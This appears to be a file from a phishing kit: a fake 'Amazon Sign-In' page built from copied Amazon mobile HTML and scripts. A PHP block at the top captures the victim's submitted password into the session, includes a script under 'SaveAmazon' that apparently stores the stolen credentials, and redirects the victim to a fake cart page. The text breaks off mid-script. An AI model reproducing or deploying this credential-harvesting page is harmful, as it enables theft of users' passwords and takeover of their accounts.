<!DOCTYPE HTML>
<?php
session_start();
error_reporting(0);
if(isset($_POST['signInd'])){
$_SESSION['password'] = $_POST['password'];
$_SESSION['loged'] = "loged1";
include('../SaveAmazon/sv1.php');
$DIR='../gp/cart/';
header("LOCATION: ".$DIR."");
}
?>
<html class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-ios a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember awa-browser" data-19ax5a9jf="mongoose" data-aui-build-date="3.21.3-2021-05-09">
<head><script async="" src="https://images-na.ssl-images-amazon.com/images/I/31YXrY93hfL.js" crossorigin="anonymous"></script>

<link rel="shortcut icon" href="../img/Amazon_icon.png">

<meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no"><meta charset="utf-8">
    <title dir="ltr">Amazon Sign-In</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    
      
      
        <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/61UhpddG6YL._RC|11iHkiAT2oL.css,01wLsDqViEL.css,11MhAJ3QIgL.css,31JhtlVsImL.css,31i+Ric3zOL.css,01DHz7m6lhL.css_.css?AUIClients/AmazonUI#mobile.us.not-trident">
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|31jdWD+JB+L.css,41K9WJ9wk7L.css_.css?AUIClients/AuthenticationPortalAssets&amp;QmmAyoMU#mobile.194821-T1">
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/11vbcpUoDhL.css?AUIClients/CVFAssets#mobile">

<script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/61-6nKPKyWL._RC|11Y+5x+kkTL.js,51KMV3Cz2XL.js,31x4ENTlVIL.js,31f4+QIEeqL.js,319DotbLfhL.js,518BI433aLL.js,01qkmZhGmAL.js,31h3-xvy9qL.js,61zp0xmgcZL.js,31yPmSSpnoL.js_.js?AUIClients/AmazonUI#mobile"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/21G215oqvfL._RC|21OJDARBhQL.js,218GJg15I8L.js,31lucpmF4CL.js,2119M3Ks9rL.js,517tVzAWvHL.js_.js?AUIClients/AuthenticationPortalAssets&amp;QmmAyoMU#mobile.194821-T1"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01wGDSlxwdL.js?AUIClients/AuthenticationPortalInlineAssets"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/318+yzWO2wL.js?AUIClients/CVFAssets#mobile"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/81oDzXaLrLL.js?AUIClients/SiegeClientSideEncryptionAUI"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/71pSbyTzIUL.js?AUIClients/FWCIMAssets"></script>

      
    
  <script type="text/javascript">
window.ue_ihe = (window.ue_ihe || 0) + 1;
if (window.ue_ihe === 1) {
(function(k,l,g){function m(a){c||(c=b[a.type].id,"undefined"===typeof a.clientX?(e=a.pageX,f=a.pageY):(e=a.clientX,f=a.clientY),2!=c||h&&(h!=e||n!=f)?(r(),d.isl&&l.setTimeout(function(){p("at",d.id)},0)):(h=e,n=f,c=0))}function r(){for(var a in b)b.hasOwnProperty(a)&&d.detach(a,m,b[a].parent)}function s(){for(var a in b)b.hasOwnProperty(a)&&d.attach(a,m,b[a].parent)}function t(){var a="";!q&&c&&(q=1,a+="&ui="+c);return a}var d=k.ue,p=k.uex,q=0,c=0,h,n,e,f,b={click:{id:1,parent:g},mousemove:{id:2,
parent:g},scroll:{id:3,parent:l},keydown:{id:4,parent:g}};d&&p&&(s(),d._ui=t)})(ue_csm,window,document);



(function(l,e){function c(b){b="";var c=a.isBFT?"b":"s",d=""+a.oid,g=""+a.lid,h=d;d!=g&&20==g.length&&(c+="a",h+="-"+g);a.tabid&&(b=a.tabid+"+");b+=c+"-"+h;b!=f&&100>b.length&&(f=b,a.cookie?a.cookie.updateCsmHit(m,b+("|"+ +new Date)):e.cookie="csm-hit="+b+("|"+ +new Date)+n+"; path=/")}function p(){f=0}function d(b){!0===e[a.pageViz.propHid]?f=0:!1===e[a.pageViz.propHid]&&c({type:"visible"})}var n="; expires="+(new Date(+new Date+6048E5)).toGMTString(),m="tb",f,a=l.ue||{},k=a.pageViz&&a.pageViz.event&&
a.pageViz.propHid;a.attach&&(a.attach("click",c),a.attach("keyup",c),k||(a.attach("focus",c),a.attach("blur",p)),k&&(a.attach(a.pageViz.event,d,e),d({})));a.aftb=1})(ue_csm,ue_csm.document);


ue_csm.ue.stub(ue,"impression");


ue.stub(ue,"trigger");



if(window.ue&&uet) { uet('bb'); }

}
</script>
<script>window.ue && ue.count && ue.count('CSMLibrarySize', 1520)</script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/41cyy9szMwL._RC|41moB86X53L.js_.js?AUIClients/NavMobileAssets-all"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01CMyuQ8OQL.js?AUIClients/InternationalCustomerPreferencesNavMobileAssets"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/31pymwzQBWL.js?AUIClients/GlowToasterAssets"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/51DxmSoGxqL.js?AUIClients/RetailSearchAutocompleteAssets&amp;AqsUHw+5#mobile.350276-T1"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/41N6Zfgd3UL.js?AUIClients/AmazonWebAppAssets"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/11VbV%2B%2BKhQL.js?AUIClients/RetailWebsiteOverlayAUIAssets"></script><style>.a2hs-ingress-container,a[href^="#nav-hbm-a2hs-trigger"]{display:none!important}.a2hs-ingress-container.a2hs-ingress-visible,a[href^="#nav-hbm-a2hs-trigger"].a2hs-ingress-visible{display:block!important}</style><style>@media all and (display-mode:standalone){#chromeless-view-progress-bar,#chromeless-view-progress-bar::after{position:fixed;top:0;left:0;right:0;height:2px}@keyframes pbAnimation{0%{right:90%}100%{right:10%}}#chromeless-view-progress-bar{background:rgba(255,255,255,.1);z-index:9999999}#chromeless-view-progress-bar::after{content:'';background:#fcbb6a;animation:pbAnimation 10s forwards}}</style><style></style></head>

  <body class="a-color-offset-background ap-locale-en_US a-m-us a-aui_72554-c a-aui_csa_templates_buildin_ww_exp_337518-t1 a-aui_csa_templates_buildin_ww_launch_337517-c a-aui_csa_templates_declarative_ww_exp_337521-t1 a-aui_csa_templates_declarative_ww_launch_337520-c a-aui_mm_desktop_exp_291916-c a-aui_mm_desktop_launch_291918-c a-aui_mm_desktop_targeted_exp_291928-c a-aui_mm_desktop_targeted_launch_291922-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c auth-show-password-enabled auth-show-password-engaged auth-show-password-ready">

<script>
!function(){function n(n,t){var r=i(n);return t&&(r=r("instance",t)),r}var r=[],c=0,i=function(t){return function(){var n=c++;return r.push([t,[].slice.call(arguments,0),n,{time:Date.now()}]),i(n)}};n._s=r,this.csa=n}();;
csa('Config', {});
if (window.csa) {
    csa("Config", {
        
        'Events.Namespace': 'csa',
        'ObfuscatedMarketplaceId': 'ATVPDKIKX0DER',
        'Events.SushiEndpoint': 'https://unagi.amazon.com/1/events/com.amazon.csm.csa.prod',
        'CacheDetection.RequestID': "VSZ4ZGX2EWQ1W9SH2WX0",
        'CacheDetection.Callback': window.ue && ue.reset,
        'LCP.elementDedup': 1
    });

    csa("Events")("setEntity", {
        page: {requestId: "VSZ4ZGX2EWQ1W9SH2WX0", meaningful: "interactive"},
        session: {id: "144-8202436-4876725"}
    });
}
!function(e){var i,r,o="splice",u=e.csa,f={},c={},a=e.csa._s,s=0,l={},g={},h={},n=Object.keys;function t(n,t){return u(n,t)}function v(n,t){var e=c[n]||{};U(e,t),c[n]=e,y(E,0)}function d(n,t,e){var i=!0;t=b(t),e&&e.buffered&&(i=(h[n]||[]).every(function(n){return!1!==t(n)})),i&&(l[n]||(l[n]=[]),l[n].push(t))}function p(n,t){if(t=b(t),n in g)t(g[n]);else{d(n,function(n){return t(n),!1})}}function m(n,t){if(u("Errors")("logError",n),f.DEBUG)throw t||n}function w(){return Math.abs(4294967295*Math.random()|0).toString(36)}function b(n,t){return function(){try{return n.apply(this,arguments)}catch(n){m(n.message||n,n)}}}function y(n,t){return e.setTimeout(b(n),t)}function E(){for(var n=0;n<a.length;){var t=a[n],e=t[0]in c;if(!e&&!r)return void(s=t.length);e?(a[o](s=n,1),D(t)):n++}}function D(n){var arguments,t=c[n[0]],e=(arguments=n[1])[0];if(!t||!t[e])return m("Undefined function: "+t+"/"+e);i=n[3],c[n[2]]=t[e].apply(t,arguments.slice(1))||{},i=0}function S(){r=1,E()}function U(t,e){n(e).forEach(function(n){t[n]=e[n]})}p("$beforeunload",S),v("Config",{instance:function(n){U(f,n)}}),u.plugin=b(function(n){n(t)}),t.config=f,t.register=v,t.on=d,t.removeListener=function(n,t){var e=l[n];e&&e[o](e.indexOf(t),1)},t.once=p,t.emit=function(n,t,e){for(var i=l[n]||[],r=0;r<i.length;)!1===i[r](t)?i[o](r,1):r++;g[n]=t||{},e&&e.buffered&&(h[n]||(h[n]=[]),100<=h[n].length&&h[n].shift(),h[n].push(t||{}))},t.UUID=function(){return[w(),w(),w(),w()].join("-")},t.time=function(n){var t=i?new Date(i.time):new Date;return"ISO"===n?t.toISOString():t.getTime()},t.error=m,t.warn=function(n,t){if(u("Errors")("logWarn",n),f.DEBUG)throw t||n},t.exec=b,t.timeout=y,t.interval=function(n,t){return e.setInterval(b(n),t)},(t.global=e).csa._s.push=function(n){n[0]in c&&(!a.length||r)?D(n):a[o](s++,0,n)},E(),y(function(){y(S,f.SkipMissingPluginsTimeout||5e3)},1)}("undefined"!=typeof window?window:global);csa.plugin(function(o){var r="addEventListener",e="requestAnimationFrame",t=o.exec,i=o.global,f=o.on;o.raf=function(n){if(i[e])return i[e](t(n))},o.on=function(n,e,t,i){return n&&"function"==typeof n[r]?n[r](e,o.exec(t),i):"string"==typeof n?f(n,e,t,i):void 0}});csa.plugin(function(o){var t,n,r={},e="localStorage",c="sessionStorage",a="local",i="session",u=o.exec;function s(e,t){var n;try{r[t]=!!(n=o.global[e]),n=n||{}}catch(e){r[t]=!(n={})}return n}function f(){t=t||s(e,a),n=n||s(c,i)}function l(e){return e&&e[i]?n:t}o.store=u(function(e,t,n){f();var o=l(n);return e?t?void(o[e]=t):o[e]:Object.keys(o)}),o.storageSupport=u(function(){return f(),r}),o.deleteStored=u(function(e,t){f();var n=l(t);if("function"==typeof e)for(var o in n)n.hasOwnProperty(o)&&e(o,n[o])&&delete n[o];else delete n[e]})});csa.plugin(function(o){function r(n){return function(r){o("Metrics",{producerId:"csa",dimensions:{message:r}})("recordMetric",n,1)}}o.register("Errors",{logError:r("jsError"),logWarn:r("jsWarn")})});csa.plugin(function(r){var o,e=r.global,i=r("Events"),f=e.location,d=e.document,a=((e.performance||{}).navigation||{}).type,t=r.on,u=r.emit,g={};function n(a,e){var t=!!o,n=(e=e||{}).keepPageAttributes;t&&(u("$beforePageTransition"),u("$pageTransition")),t&&!n&&i("removeEntity","page"),o=r.UUID(),n?g.id=o:g={schemaId:"<ns>.PageEntity.1",id:o,url:f.href,server:f.hostname,path:f.pathname,referrer:d.referrer,title:d.title},Object.keys(a||{}).forEach(function(e){g[e]=a[e]}),i("setEntity",{page:g}),u("$pageChange",g,{buffered:1}),t&&u("$afterPageTransition")}function l(){u("$load"),u("$ready"),u("$afterload")}function s(){u("$ready"),u("$beforeunload"),u("$unload"),u("$afterunload")}f&&d&&(t(e,"beforeunload",s),t(e,"pagehide",s),"complete"===d.readyState?l():t(e,"load",l),r.register("SPA",{newPage:n}),n({transitionType:{0:"hard",1:"refresh",2:"back-button"}[a]||"unknown"}))});csa.plugin(function(c){var t="Events",e="UNKNOWN",a="id",u="all",n="messageId",i="timestamp",f="producerId",o="application",r="obfuscatedMarketplaceId",s="entities",d="schemaId",l="version",p="attributes",v="<ns>",g=c.config,h=(c.global.location||{}).host,m=g[t+".Namespace"]||"csa_other",I=g.Application||"Other"+(h?":"+h:""),b=c("Transport"),y={},O=function(t,e){Object.keys(t).forEach(e)};function E(n,i,o){O(i,function(t){var e=o===u||(o||{})[t];t in n||(n[t]={version:1,id:i[t][a]||c.UUID()}),U(n[t],i[t],e)})}function U(e,n,i){O(n,function(t){!function(t,e,n){return"string"!=typeof e&&t!==l?c.error("Attribute is not of type string: "+t):!0===n||1===n||(t===a||!!~(n||[]).indexOf(t))}(t,n[t],i)||(e[t]=n[t])})}function N(o,t,r){O(t,function(t){var e=o[t];if(e[d]){var n={},i={};n[a]=e[a],n[f]=e[f]||r,n[d]=e[d],n[l]=e[l]++,n[p]=i,S(n),U(i,e,1),k(i),b("log",n)}})}function S(t){t[i]=function(t){return"number"==typeof t&&(t=new Date(t).toISOString()),t||c.time("ISO")}(t[i]),t[n]=t[n]||c.UUID(),t[o]=I,t[r]=g.ObfuscatedMarketplaceId||e,t[d]=t[d].replace(v,m)}function k(t){delete t[l],delete t[d],delete t[f]}function w(o){var r={};this.log=function(t,e){var n={},i=(e||{}).ent;return t?"string"!=typeof t[d]?c.error("A valid schema id is required for the event"):(S(t),E(n,y,i),E(n,r,i),E(n,t[s]||{},i),O(n,function(t){k(n[t])}),t[f]=o[f],t[s]=n,void b("log",t)):c.error("The event cannot be undefined")},this.setEntity=function(t){E(r,t,u),N(r,t,o[f])}}g["KillSwitch."+t]||c.register(t,{setEntity:function(t){E(y,t,u),N(y,t,"csa")},removeEntity:function(t){delete y[t]},instance:function(t){return new w(t)}})});csa.plugin(function(s){var c,l="Transport",g="post",u="preflight",r="csa.cajun.",i="store",a="deleteStored",f="sendBeacon",t=0,e=s.config[l+".BufferSize"]||2e3,h=s.config[l+".RetryDelay"]||1500,o=[],p=0,d=[],v=s.global,n=s.on,y=s.once,m=v.document,E=s.timeout,R=s.config[l+".FlushInterval"]||5e3,S=0;function b(n){if(864e5<s.time()-+new Date(n.timestamp))return s.warn("Event is too old: "+n);p<e&&(o.push(n),p++,!S&&t&&(S=E(w,R)))}function w(){d.forEach(function(t){var e=[];o.forEach(function(n){t.accepts(n)&&e.push(n)}),e.length&&(t.chunks?t.chunks(e).forEach(function(n){I(t,n)}):I(t,e))}),o=[],S=0}function I(t,e){function o(){s[a](r+n)}var n=s.UUID();s[i](r+n,JSON.stringify(e)),[function(n,t,e){var o=v.navigator||{},r=v.cordova||{};if(!o[f]||!n[g])return 0;n[u]&&r&&"ios"===r.platformId&&!c&&((new Image).src=n[u]().url,c=1);var i=n[g](t);if(!i.type&&o[f](i.url,i.body))return e(),1},function(n,t,e){if(!n[g])return 0;var o=n[g](t),r=o.url,i=o.body,c=o.type,u=new XMLHttpRequest,a=0;function f(n,t,e){u.open("POST",n),e&&u.setRequestHeader("Content-Type",e),u.send(t)}return u.onload=function(){u.status<299?e():s.config[l+".XHRRetries"]&&a<3&&E(function(){f(r,i,c)},++a*h)},f(r,i,c),1}].some(function(n){try{return n(t,e,o)}catch(n){}})}y("$afterload",function(){t=1,function(e){(s[i]()||[]).forEach(function(n){if(!n.indexOf(r))try{var t=s[i](n);s[a](n),JSON.parse(t).forEach(e)}catch(n){s.error(n)}})}(b),n(m,"visibilitychange",w,!1),w()}),y("$afterunload",function(){t=1,w()}),n("$afterPageTransition",function(){p=0}),s.register(l,{log:b,register:function(n){d.push(n)}})});csa.plugin(function(n){var r=n.config["Events.SushiEndpoint"];n("Transport")("register",{accepts:function(n){return n.schemaId},post:function(n){var t=n.map(function(n){return{data:n}});return{url:r,body:JSON.stringify({events:t})}},preflight:function(){var n,t=/\/\/(.*?)\//.exec(r);return t&&t[1]&&(n="https://"+t[1]+"/ping"),{url:n}},chunks:function(n){for(var t=[];500<n.length;)t.push(n.splice(0,500));return t.push(n),t}})});csa.plugin(function(n){var t,a,o,r,e=n.config,i="PageViews",d=e[i+".ImpressionMinimumTime"]||1e3,s="hidden",c="innerHeight",g="innerWidth",l="renderedTo",f=l+"Viewed",m=l+"Meaningful",u=l+"Impressed",p=1,v=2,h=3,w=4,y=5,P="loaded",I=7,T=8,b=n.global,E=n.on,V=n("Events",{producerId:"csa"}),$=b.document,M={},S={},H=y;function K(e){if(!M[I]){var i;if(M[e]=n.time(),e!==h&&e!==P||(t=t||M[e]),t&&H===w)a=a||M[e],(i={})[m]=t-o,i[f]=a-o,R("PageView.4",i),r=r||n.timeout(j,d);if(e!==y&&e!==p&&e!==v||(clearTimeout(r),r=0),e!==p&&e!==v||R("PageRender.3",{transitionType:e===p?"hard":"soft"}),e===I)(i={})[m]=t-o,i[f]=a-o,i[u]=M[e]-o,R("PageImpressed.2",i)}}function R(e,i){S[e]||(i.schemaId="<ns>."+e,V("log",i,{ent:"all"}),S[e]=1)}function W(){0===b[c]&&0===b[g]?(H=T,n("Events")("setEntity",{page:{viewport:"hidden-iframe"}})):H=$[s]?y:w,K(H)}function j(){K(I),r=0}function k(){var e=o?v:p;M={},S={},a=t=0,o=n.time(),K(e),W()}function q(){var e=$.readyState;"interactive"===e&&K(h),"complete"===e&&K(P)}e["KillSwitch."+i]||($&&void 0!==$[s]?(k(),E($,"visibilitychange",W,!1),E($,"readystatechange",q,!1),E("$afterPageTransition",k),E("$timing:loaded",q),n.once("$load",q)):n.warn("Page visibility not supported"))});csa.plugin(function(c){var s=c.config["Interactions.ParentChainLength"]||15,e="click",r="touches",f="timeStamp",o="length",u="pageX",g="pageY",p="pageXOffset",h="pageYOffset",m=250,v=5,d=200,l=.5,t={capture:!0,passive:!0},X=c.global,Y=c.emit,n=c.on,x=X.Math.abs,a=(X.document||{}).documentElement||{},y={x:0,y:0,t:0,sX:0,sY:0},N={x:0,y:0,t:0,sX:0,sY:0};function b(t){if(t.id)return"//*[@id='"+t.id+"']";var e=function(t){var e,n=1;for(e=t.previousSibling;e;e=e.previousSibling)e.nodeName===t.nodeName&&(n+=1);return n}(t),n=t.nodeName;return 1!==e&&(n+="["+e+"]"),t.parentNode&&(n=b(t.parentNode)+"/"+n),n}function I(t,e,n){var a=c("Content",{target:n}),i={schemaId:"<ns>.ContentInteraction.1",interaction:t,interactionData:e,messageId:c.UUID()};if(n){var r=b(n);r&&(i.attribution=r);var o=function(t){for(var e=t,n=e.tagName,a=!1,i=t?t.href:null,r=0;r<s;r++){if(!e||!e.parentElement){a=!0;break}n=(e=e.parentElement).tagName+"/"+n,i=i||e.href}return a||(n=".../"+n),{pc:n,hr:i}}(n);o.pc&&(i.interactionData.parentChain=o.pc),o.hr&&(i.interactionData.href=o.hr)}a("log",i),Y("$content.interaction",i)}function i(t){I(e,{interactionX:""+t.pageX,interactionY:""+t.pageY},t.target)}function C(t){if(t&&t[r]&&1===t[r][o]){var e=t[r][0];N=y={e:t.target,x:e[u],y:e[g],t:t[f],sX:X[p],sY:X[h]}}}function D(t){if(t&&t[r]&&1===t[r][o]&&y&&N){var e=t[r][0],n=t[f],a=n-N.t,i={e:t.target,x:e[u],y:e[g],t:n,sX:X[p],sY:X[h]};N=i,d<=a&&(y=i)}}function E(t){if(t){var e=x(y.x-N.x),n=x(y.y-N.y),a=x(y.sX-N.sX),i=x(y.sY-N.sY),r=t[f]-y.t;if(m<1e3*e/r&&v<e||m<1e3*n/r&&v<n){var o=n<e;o&&a&&e*l<=a||!o&&i&&n*l<=i||I((o?"horizontal":"vertical")+"-swipe",{interactionX:""+y.x,interactionY:""+y.y,endX:""+N.x,endY:""+N.y},y.e)}}}n(a,e,i,t),n(a,"touchstart",C,t),n(a,"touchmove",D,t),n(a,"touchend",E,t)});

</script>
<script type="text/javascript">

(function(){function l(a){for(var c=b.location.search.substring(1).split("&"),e=0;e<c.length;e++){var d=c[e].split("=");if(d[0]===a)return d[1]}}window.amzn=window.amzn||{};amzn.copilot=amzn.copilot||{};var b=window,f=document,g=b.P||b.AmazonUIPageJS,h=f.head||f.getElementsByTagName("head")[0],m=0,n=0;amzn.copilot.checkCoPilotSession=function(){f.cookie.match("cpidv")&&("undefined"!==typeof jQuery&&k(jQuery),g&&g.when&&g.when("jQuery").execute(function(a){k(a)}),b.amznJQ&&b.amznJQ.available&&b.amznJQ.available("jQuery",
function(){k(jQuery)}),b.jQuery||g||b.amznJQ||q())};var q=function(){m?b.ue&&"function"===typeof b.ue.count&&b.ue.count("cpJQUnavailable",1):(m=1,f.addEventListener?f.addEventListener("DOMContentLoaded",amzn.copilot.checkCoPilotSession,!1):f.attachEvent&&f.attachEvent("onreadystatechange",function(){"complete"===f.readyState&&amzn.copilot.checkCoPilotSession()}))},k=function(a){if(!n){n=1;amzn.copilot.jQuery=a;a=l("debugJS");var c="https:"===b.location.protocol?1:0,e=1;url="/gp/copilot/handlers/copilot_strings_resources.html";
window.texas&&texas.locations&&(url=texas.locations.makeUrl(url));g&&g.AUI_BUILD_DATE&&(e=0);amzn.copilot.jQuery.ajax&&amzn.copilot.jQuery.ajax({url:url,dataType:"json",data:{isDebug:a,isSecure:c,includeAUIP:e},success:function(a){amzn.copilot.vip=a.serviceEndPoint;amzn.copilot.enableMultipleTabSession=a.isFollowMe;r(a)},error:function(){b.ue.count("cpLoadResourceError",1)}})}},r=function(a){var c=amzn.copilot.jQuery,e=function(){amzn.copilot.setup(c.extend({isContinuedSession:!0},a))};a.CSSUrls&&
c.each(a.CSSUrls[0],function(a,c){var b=f.createElement("link");b.type="text/css";b.rel="stylesheet";b.href=c;h.appendChild(b)});a.CSSTag&&s(a.CSSTag);if(a.JSUrls){var d=l("forceSynchronousJS"),b=a.JSUrls[0];c.each(b,function(a,c){a===b.length-1?p(c,d,e):p(c,d)})}a.JSTag&&(t(a.JSTag),P.when("CSCoPilotPresenterAsset").execute(function(){e()}))},t=function(a){var c=f.createElement("div");c.innerHTML=a;a=0;for(var b=c.children.length;a<b;a++){var d=f.createElement("script");d.type="text/javascript";
d.innerHTML=c.children[a].innerHTML;h.appendChild(d)}},s=function(a){var b=f.createElement("div");b.innerHTML=a;a=0;for(var e=b.children.length;a<e;a++)h.appendChild(b.children[a])},p=function(a,b,e){var d=f.createElement("script");d.type="text/javascript";d.src=a;d.async=b?!1:!0;e&&(d.onload=e);h.appendChild(d)}})();

amzn.copilot.checkCoPilotSession();

</script>

<script>window.ue && ue.count && ue.count('CSMLibrarySize', 13697)</script><div id="a-page"><script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{"AUI_MM_DESKTOP_LAUNCH_291918":"C","AUI_CSA_TEMPLATES_BUILDIN_WW_EXP_337518":"T1","AUI_CSA_TEMPLATES_DECLARATIVE_WW_LAUNCH_337520":"C","AUI_CSA_TEMPLATES_BUILDIN_WW_LAUNCH_337517":"C","AUI_CSA_TEMPLATES_DECLARATIVE_WW_EXP_337521":"T1"}</script>
    <div class="a-section a-spacing-none">
      
      
      <!-- NAVYAAN CSS -->
<style type="text/css">
.nav-sprite-v3 .nav-sprite {
  background-image: url(https://images-na.ssl-images-amazon.com/images/G/01/gno/sprites/new-nav-sprite-global-1x_blueheaven-fluid._CB406836994_.png);
  background-repeat: no-repeat;
}
.nav-spinner {
  background-image: url(https://images-na.ssl-images-amazon.com/images/G/01/javascripts/lib/popover/images/snake._CB485935611_.gif);
}
</style>

<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/314xMGKl-SL._RC|41KBYOkTjIL.css,51gWEcPTZPL.css_.css?AUIClients/NavMobileAssets-all&amp;xNMv+lD/#339571-T1">
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/41C6LaLLmFL.css?AUIClients/InternationalCustomerPreferencesNavMobileAssets">
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/01+72+wCC9L.css?AUIClients/GlowToasterAssets#mobile">
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/319K+evaWlL.css?AUIClients/RetailSearchAutocompleteAssets&amp;AqsUHw+5#mobile.350276-T1">

      <!-- NAVYAAN JS -->
<script type="text/javascript">!function(n){function e(n,e){return{m:n,a:function(n){return[].slice.call(n)}(e)}}document.createElement("header");var r=function(n){function u(n,r,u){n[u]=function(){a._replay.push(r.concat(e(u,arguments)))}}var a={};return a._sourceName=n,a._replay=[],a.getNow=function(n,e){return e},a.when=function(){var n=[e("when",arguments)],r={};return u(r,n,"run"),u(r,n,"declare"),u(r,n,"publish"),u(r,n,"build"),r},u(a,[],"declare"),u(a,[],"build"),u(a,[],"publish"),u(a,[],"importEvent"),r._shims.push(a),a};r._shims=[],n.$Nav||(n.$Nav=r("rcx-nav")),n.$Nav.make||(n.$Nav.make=r)}(window)</script><script type="text/javascript">
$Nav.importEvent('navbarJS-mobile');
$Nav.declare('img.sprite', {
  'png32': 'https://images-na.ssl-images-amazon.com/images/G/01/gno/sprites/new-nav-sprite-global-1x_blueheaven-fluid._CB406836994_.png',
  'png32-2x': 'https://images-na.ssl-images-amazon.com/images/G/01/gno/sprites/new-nav-sprite-global-2x_blueheaven-fluid._CB406837170_.png'
});
window._navbarSpriteUrl = 'https://images-na.ssl-images-amazon.com/images/G/01/gno/sprites/new-nav-sprite-global-1x_blueheaven-fluid._CB406836994_.png';
$Nav.declare('img.pixel', 'https://images-na.ssl-images-amazon.com/images/G/01/x-locale/common/transparent-pixel._CB485935036_.gif');
var nav_t_after_preload_JS = + new Date();
</script>
<img src="https://images-na.ssl-images-amazon.com/images/G/01/gno/sprites/new-nav-sprite-global-1x_blueheaven-fluid._CB406836994_.png" style="display:none" alt="">
<script type="text/javascript">var nav_t_after_preload_sprite = + new Date();</script>

<script>
(window.AmazonUIPageJS ? AmazonUIPageJS : P).when('navCF').execute(function() {
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/41cyy9szMwL._RC|41moB86X53L.js_.js?AUIClients/NavMobileAssets-all');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/01CMyuQ8OQL.js?AUIClients/InternationalCustomerPreferencesNavMobileAssets');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/31pymwzQBWL.js?AUIClients/GlowToasterAssets');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/51DxmSoGxqL.js?AUIClients/RetailSearchAutocompleteAssets&AqsUHw+5#mobile.350276-T1');
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/41N6Zfgd3UL.js?AUIClients/AmazonWebAppAssets');
});
</script>

      
      
  <!-- NAVYAAN -->





<!-- MOBILE-APP-BANNER -->



<script type="text/javascript">var nav_t_upnav_begin = + new Date();</script>

<!--NAVYAAN-UPNAV-MARKER-->

<!-- navmet initial definition -->

<script type="text/javascript">
  if(window.navmet===undefined) {
    window.navmet=[];
    if (window.performance && window.performance.timing && window.ue_t0) {
      var t = window.performance.timing;
      var now = + new Date();
      window.navmet.basic = {
        'networkLatency': (t.responseStart - t.fetchStart),
        'navFirstPaint': (now - t.responseStart),
        'NavStart': (now - window.ue_t0)
      };
      window.navmet.push({key:"NavFirstPaintStart",end:+new Date(),begin:window.ue_t0});
    }
  }
  if (window.ue_t0) {
     window.navmet.push({key:"NavMainStart",end:+new Date(),begin:window.ue_t0});
  }
</script>


<script type="text/javascript">window.navmet.tmp=+new Date();</script>
    <style mark="aboveNavInjectionCSS" type="text/css">
      #nav-mobile-airstream-stripe img {max-width: 100%;} .nav-searchbar-wrapper {display: flex; }
    </style>
    <script mark="aboveNavInjectionJS" type="text/javascript">
      try {
        window.$Nav && $Nav.when('jQuery', 'searchScoping').run(function($){var hidden=$('#nav-search-form input[type=hidden]'); if(hidden.length===2 && hidden[1].value==='10329849011') {hidden[0].remove();}})
      } catch ( err ) {
        if ( window.$Nav ) {
          window.$Nav.when('metrics', 'logUeError').run(function(metrics, log) {
            metrics.increment('NavJS:AboveNavInjection:error');
            log(err.toString(), {
              'attribution': 'AmazonNavigationCards',
              'logLevel': 'FATAL'
            });
          });
        }
      }
    </script>
<script type="text/javascript">window.navmet.push({key:'AboveNavInjection',end:+new Date(),begin:window.navmet.tmp});</script>


<script type="text/javascript">
  window.uet && uet('ns');
</script>


<script type="text/javascript">window.navmet.tmp=+new Date();</script>
<script type="text/javascript">
